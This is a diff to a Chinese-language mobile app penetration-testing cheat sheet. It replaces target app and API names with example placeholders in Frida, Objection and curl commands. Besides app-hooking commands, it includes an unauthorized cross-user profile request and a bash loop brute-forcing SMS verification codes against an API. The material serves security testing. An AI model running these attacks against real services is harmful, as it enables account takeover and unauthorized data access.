@@ -63,23 +63,23 @@
 
 ```bash
 # 追踪所有加密操作
-frida-trace -U -f com.target.app -j '*Cipher*!*'
+frida-trace -U -f com.example.app -j '*Cipher*!*'
 
 # 追踪所有 HTTP 请求
-frida-trace -U -f com.target.app -j '*OkHttp*!*'
+frida-trace -U -f com.example.app -j '*OkHttp*!*'
 
 # 追踪 SharedPreferences 读写
-frida-trace -U -f com.target.app -j '*SharedPreferences*!*'
+frida-trace -U -f com.example.app -j '*SharedPreferences*!*'
 
 # 追踪所有 native 函数调用
-frida-trace -U -f com.target.app -i 'Java_*'
+frida-trace -U -f com.example.app -i 'Java_*'
 ```
 
 ### Objection 快速命令
 
 ```bash
 # 连接
-objection -g com.target.app explore
+objection -g com.example.app explore
 
 # 常用命令
 android hooking list activities
@@ -176,7 +176,7 @@ sqlite connect <db_path>         # 连接数据库
 ```bash
 # 越权测试
 curl -H "Authorization: Bearer USER_A_TOKEN" \
-     "https://api.target.com/users/USER_B_ID/profile"
+     "https://api.example.invalid/users/USER_B_ID/profile"
 
 # Token 重放
 # 1. 正常登录获取 token
@@ -185,7 +185,7 @@ curl -H "Authorization: Bearer USER_A_TOKEN" \
 
 # 短信验证码爆破
 for code in $(seq 0000 9999); do
-    curl -X POST "https://api.target.com/verify" \
+    curl -X POST "https://api.example.invalid/verify" \
          -d "phone=13800138000&code=$code"
 done
 ```
